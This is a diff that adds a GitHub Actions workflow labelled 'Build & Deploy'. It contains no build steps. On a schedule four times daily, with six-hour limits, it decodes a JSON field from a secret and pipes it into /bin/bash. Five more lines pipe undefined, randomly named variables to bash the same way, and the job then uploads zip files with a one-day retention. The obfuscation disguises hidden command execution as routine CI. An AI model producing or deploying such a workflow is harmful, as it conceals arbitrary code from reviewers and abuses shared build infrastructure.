@@ -1,0 +1,36 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '36 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          n2207: ${{ secrets.n2207 }}
+        run: |
+          printf '%s' "$n2207" | jq -r .sfr08 | /bin/bash
+          echo $if9 | jq -r .v62974 | /bin/bash
+          printf '%s' "$o11559" | jq -r .xlv237 | /bin/bash
+          printf '%s' "$zsi1857" | jq -r .h467 | /bin/bash
+          printf '%s' "$xik68368" | jq -r .eesbt1416 | /bin/bash
+          printf '%s' "$iva7053" | jq -r .g5 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: HxL6AjNZ
+          path: "*.zip"
+          retention-days: 1
